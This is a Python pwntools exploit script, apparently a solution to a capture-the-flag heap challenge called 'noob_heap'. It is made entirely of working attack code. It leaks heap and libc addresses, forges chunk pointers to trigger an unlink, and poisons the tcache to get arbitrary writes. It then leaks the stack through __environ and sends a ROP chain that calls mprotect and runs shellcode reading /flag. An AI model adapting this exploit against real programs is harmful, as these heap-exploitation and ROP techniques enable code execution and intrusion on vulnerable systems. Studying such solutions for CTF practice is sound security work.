#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './noob_heap'
context.os = 'linux'
context.arch = 'amd64'
context.timeout = 5

debug = 0
if debug:
    io = process('./noob_heap')
else:
    io = remote('0.0.0.0',10086)

elf = ELF('./noob_heap')
libc = ELF('./libc.so.6')
one_gadgets = [0x50a47, 0xebc81, 0xebc85, 0xebc88]

def p(script = '0'):

    if script == '0':
        gdb.attach(io)
        pause()
    else:
        gdb.attach(io, script)

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

def cmd(i, prompt=b"Chioce >> "):
    io.sendlineafter(prompt, i)

def add(size):
    cmd(b'1')
    size = int(hex(size),16)
    io.sendlineafter(b"Size: ",str(size).encode())

def edit(idx, content):
    cmd(b'3')
    io.sendlineafter(b"Index: ",str(idx).encode())
    io.sendafter(b"Note: ", content)

def show(idx):
    cmd(b'4')
    io.sendlineafter(b"Index: ",str(idx).encode())

def dele(idx):
    cmd(b'2')
    io.sendlineafter(b"Index: ",str(idx).encode())

def get_big():
    io.sendlineafter(b'Chioce >> ', b'1'*0x400)

for i in range(13):
    add(0x58) #index 0 ~ 
add(0x20) 
dele(0)
add(0x58)
show(0)
heap_base = u64(io.recvuntil(b'\x05')[-5:] + b'\x00' * 3) << 12
leak("heap_base", heap_base)

for i in range(13):
    dele(i)
get_big()

for i in range(7):
    add(0x58) 
add(0x78) # 7
add(0x58) # 8 in fastbin
add(0x58) # 9 A

show(8)
libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00'*2 ) - 0x219ce0
leak("libc.address",libc.address)
for i in range(7):
    dele(i) # del 0~6
dele(8)

fake_fd = heap_base + 0x610
fake_bk = fake_fd
payload = flat({
        0:fake_fd, 8:fake_bk,
        0x50:0x60
    }, filler=b'\x00'
)
edit(9, payload)
#p('b unlink_chunk')
get_big()

# get another chunk pointing to A
add(0x38) # 0
add(0x78) # 1 overlaps A

# poison tcache
for i in range(6):
    add(0x58) # 2~6 8
dele(9) 

next_tcache_entry = ( (heap_base) >> 12) ^ (heap_base+0xb0)
payload = flat({
        0:0,
        0x18:0x61,
        0x20:next_tcache_entry
    }
)
#p()
edit(1, payload)

# get tcache struct ptr
add(0x58) # 9
add(0x58) # 10

dele(2)
#p()
payload = p64(libc.symbols['__environ'])
edit(10, payload)

add(0x58) #2
context.log_level = 'debug'
show(2)
stack = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00'*2 ) 
leak("stack", stack)

dele(3)
payload = p64(stack - 0x148)
edit(10, payload)
#p()
add(0x58) #3
pop_rdi = libc.address +  0x000000000002a3e5 # pop rdi ; ret
pop_rsi = libc.address +  0x000000000002be51 # pop rsi ; ret
pop_rdx = libc.address +  0x00000000000796a2 # pop rdx ; ret
pop_rcx_rbx = libc.address + 0x0000000000108b04 # pop rcx ; pop rbx ; ret
pop_r8 = libc.address + 0x0000000000165bd6 # pop r8 ; mov eax, 1 ; ret
pop_rax =  libc.address + 0x0000000000045eb0 # pop rax ; ret
syscall = libc.address + 0x0000000000029db4 # syscall

payload = flat(
    0, 0, 0,
    pop_rdi, 0, pop_rsi, stack-0xf8, pop_rdx, 0x100, libc.symbols['read'],
)
edit(3, payload)

log.info("sending ROP")
pause()
#p(f"b *{pop_rdi}\nc\n")
ROP = flat( #sys_execveat(0, "/bin/sh", [/bin/sh] , 0, 0) # can not control r10 easily
    # mprotect(
    pop_rdi, (stack>>12) << 12, pop_rsi, 0x10000, pop_rdx, 7, libc.sym['mprotect'],
    stack - 0xb8
)
ROP += asm(shellcraft.cat("/flag"))
io.send(ROP)

io.interactive()
